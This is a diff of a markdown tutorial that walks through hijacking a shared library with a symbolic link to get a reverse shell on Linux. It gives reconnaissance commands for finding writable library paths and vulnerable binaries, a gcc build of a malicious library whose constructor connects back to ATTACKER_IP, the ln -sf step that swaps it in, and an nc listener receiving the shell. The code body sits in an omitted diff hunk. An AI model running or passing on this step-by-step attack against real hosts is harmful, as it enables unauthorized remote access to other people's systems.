@@ -1,58 +1,69 @@
-Below is an example of exploiting **Hijacking via Symbolic Links** to achieve a reverse shell on a Linux target. This technique involves creating a symbolic link that redirects a legitimate shared library to a malicious one in a writable directory exploited by the target program. I’ll also include helpful commands to identify a suitable target.
+Below is an example of exploiting **Hijacking via Symbolic Links**  to achieve a reverse shell on a Linux target. This technique involves creating a symbolic link that redirects a legitimate shared library to a malicious one in a writable directory exploited by the target program.
 
 ### How It Works
-1. The target program attempts to load a shared library (e.g., `libcustom.so`) from a known location (e.g., `/tmp`).
-2. By creating a symlink with the same name pointing to your malicious library, the dynamic linker loads your version instead.
-3. The constructor function `init()` in the malicious library executes upon loading, spawning the reverse shell.
+1. The target program loads `libcustom.so` from a known location (e.g., `/tmp`).
+2. The symbolic link redirects the load to your malicious library (`/tmp/malicious-libcustom.so`).
+3. The constructor function `init()` executes upon loading, spawning the reverse shell.
 
 ---
 
 ### Helpful Commands for Identifying Targets
-- **Check writable directories in library paths**:
+- **Find writable directories**:
   ```bash
-  echo $LD_LIBRARY_PATH | tr ':' '\n' | xargs -I {} ls -ld {}
+  find /tmp /var/tmp /home -type d -writable
   ```
-  Look for directories with `rw` permissions accessible to your user.
+  Identifies potential locations for symlinks.
 
-- **Monitor library loading in real-time**:
+- **List existing symlinks**:
   ```bash
-  strace -e open,openat /path/to/target_program 2>&1 | grep ".so"
+  ls -l /tmp | grep ^l
   ```
-  This traces which `.so` files the program opens and their paths.
+  Checks for libraries already using symlinks you can overwrite.
 
-- **Find all programs using a specific library**:
+- **Find dynamically linked binaries**:
   ```bash
-  ldd /bin/* /usr/bin/* 2>/dev/null | grep "libcustom.so" | awk '{print $NF}'
+  file /usr/bin/* | grep 'dynamically linked' | awk -F: '{print $1}'
   ```
-  Replace `libcustom.so` with the library you’re targeting.
+  Lists candidates to inspect with `ldd`.
 
-- **Check ELF headers for RPATH (if applicable)**:
+- **Check running processes**:
   ```bash
-  readelf -d /path/to/target_program | grep 'RPATH\|RUNPATH'
+  ps aux | grep -v grep | grep /usr/local/bin
   ```
-  Ensure the program isn’t locked to a specific path that overrides your symlink.
+  Identifies running programs that might load libraries.
+
+- **Search cron jobs**:
+  ```bash
+  crontab -l; cat /etc/crontab; ls /etc/cron.*
+  ```
+  Finds scheduled tasks using vulnerable binaries.
 
 ---
 
 ### Limitations and Notes
-- **Writable Directory**: Requires the target program to load a library from a directory you can write to (e.g., `/tmp`). Many system binaries use `/usr/lib` or `/lib`, which are typically read-only without root.
-- **Timing**: If the legitimate library is recreated or overwritten (e.g., by an update), your symlink may need to be reapplied.
+- **Writable Directory**: Requires the target to load from a writable location (e.g., `/tmp`). System paths like `/usr/lib` need root.
+- **Timing**: The symlink must persist or be recreated if the legitimate library is updated.
 - **Firewall**: The target must allow outbound connections to your IP and port.
-- **Detection**: Symlink creation or network activity could be flagged by security tools.
+- **Detection**: Symlink creation can be flagged by monitoring tools.
+- **Cleanup**: Remove the symlink:
+  ```bash
+  rm /tmp/libcustom.so
+  ```
 
 
+### Exploiting Symbolic Links for a Reverse Shell
 
-### Prerequisites
+#### Prerequisites
 1. **Attacker Machine**: A system listening for the reverse shell (e.g., using `netcat`).
-2. **Target Machine**: A Linux system where a program loads a library from a predictable or writable location, and you have the ability to create symlinks.
+2. **Target Machine**: A Linux system where a program loads a library from a predictable or writable location.
 3. **Compiler**: `gcc` to build the malicious library.
-4. **Permissions**: Ability to write to a directory in the library search path or exploited by the target.
+4. **Permissions**: Write access to a directory in the library search path.
 
 ---
 
-### Step-by-Step Example
+#### Step-by-Step Example
 
-#### 1. **Create the Malicious Shared Library**
+##### 1. **Create the Malicious Shared Library**
 Create a C file (e.g., `malicious_lib.c`) with the following code:
 
 ```c
@@ -87,87 +98,86 @@ void __attribute__((constructor)) init() {
 
 - Replace `"ATTACKER_IP"` with your attacker machine’s IP (e.g., `192.168.1.100`).
 
-#### 2. **Compile the Malicious Library**
-Compile it into a shared library, naming it to match a library the target program depends on (e.g., `libtarget.so`):
+##### 2. **Compile the Malicious Library**
+Compile it into a shared library (e.g., `libcustom.so`):
 
 ```bash
-gcc -shared -fPIC -o libtarget.so malicious_lib.c
+gcc -shared -fPIC -o libcustom.so malicious_lib.c
 ```
 
-- You’ll determine the exact library name later using the target identification commands.
-
-#### 3. **Move the Library to a Controlled Location**
-Place the malicious library in a directory you control:
+##### 3. **Set Up the Malicious Library Location**
+Move the library to a directory you control:
 
 ```bash
-mv libtarget.so /tmp/malicious-libtarget.so
+mv libcustom.so /tmp/malicious-libcustom.so
+chmod 755 /tmp/malicious-libcustom.so
 ```
 
-#### 4. **Identify a Suitable Target Program**
-Use the following commands to find a program and library suitable for symlink hijacking:
+##### 4. **Identify a Suitable Target Program**
+Use these helpful commands to find a program loading libraries from a writable directory:
 
-- **List dynamically linked libraries of a program**:
+- **Check library dependencies**:
   ```bash
-  ldd /path/to/target_program
+  ldd /usr/local/bin/vuln_app
   ```
   Example output:
   ```
-  libcrypto.so.1.1 => /usr/lib/libcrypto.so.1.1
   libcustom.so => /tmp/libcustom.so
+  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
   ```
-  Look for libraries loaded from writable or predictable directories (e.g., `/tmp`).
+  Look for libraries in writable directories (e.g., `/tmp`).
 
-- **Check library search order**:
+- **Trace library loading**:
   ```bash
-  LD_DEBUG=libs /path/to/target_program 2>&1 | grep 'find library'
+  LD_DEBUG=libs /usr/local/bin/vuln_app 2>&1 | grep 'find library'
   ```
-  This shows where the dynamic linker searches for libraries. Look for directories like `/tmp` or other writable paths.
+  Shows where libraries are loaded from.
 
-- **Find programs loading libraries from specific directories**:
+- **Monitor file opens**:
   ```bash
-  find /usr/bin -type f -exec ldd {} + 2>/dev/null | grep "/tmp"
+  strace -e open,openat /usr/local/bin/vuln_app 2>&1 | grep ".so"
   ```
-  This searches for binaries in `/usr/bin` that load libraries from `/tmp`, a common writable directory.
+  Identifies library paths, especially writable ones.
 
-- **Check for existing symlinks**:
+- **Find programs using a specific directory**:
   ```bash
-  ls -l /path/to/library_dir | grep ^l
+  ldd /usr/bin/* /usr/local/bin/* 2>/dev/null | grep "/tmp" | awk '{print $NF}'
   ```
-  Identify if the target directory already uses symlinks you can overwrite.
+  Lists binaries loading libraries from `/tmp`.
 
-For this example, assume you find a program (`/usr/bin/vuln_app`) that loads `libcustom.so` from `/tmp`:
+- **Check directory permissions**:
+  ```bash
+  ls -ld /tmp
+  ```
+  Confirms `/tmp` is writable (e.g., `drwxrwxrwt`).
 
-```
-libcustom.so => /tmp/libcustom.so
-```
+For this example, assume `/usr/local/bin/vuln_app` loads `libcustom.so` from `/tmp`.
 
-#### 5. **Create the Symbolic Link**
-On the target machine, replace the legitimate library with a symlink pointing to your malicious library:
+##### 5. **Create the Symbolic Link**
+Replace the legitimate library with a symlink to your malicious one:
 
 ```bash
-ln -sf /tmp/malicious-libtarget.so /tmp/libcustom.so
+ln -sf /tmp/malicious-libcustom.so /tmp/libcustom.so
 ```
 
 - `-s`: Creates a symbolic link.
-- `-f`: Forces overwrite if the file already exists.
+- `-f`: Overwrites if it exists.
 
-#### 6. **Set Up the Listener on the Attacker Machine**
-Start a `netcat` listener on your attacker machine:
+##### 6. **Set Up the Listener on the Attacker Machine**
+Start a `netcat` listener:
 
 ```bash
 nc -lvnp 4444
 ```
 
-#### 7. **Run the Target Program**
-Execute the target program on the target machine:
+##### 7. **Run the Target Program**
+Execute the target program:
 
 ```bash
-/usr/bin/vuln_app
+/usr/local/bin/vuln_app
 ```
 
-- When the program loads `libcustom.so`, it follows the symlink to your malicious library, triggering the reverse shell.
-
-#### 8. **Receive the Reverse Shell**
+##### 8. **Receive the Reverse Shell**
 On the attacker machine, your `netcat` listener should receive the connection:
 
 ```
@@ -179,4 +189,5 @@ target_user
 ```
 
 ---
+
 
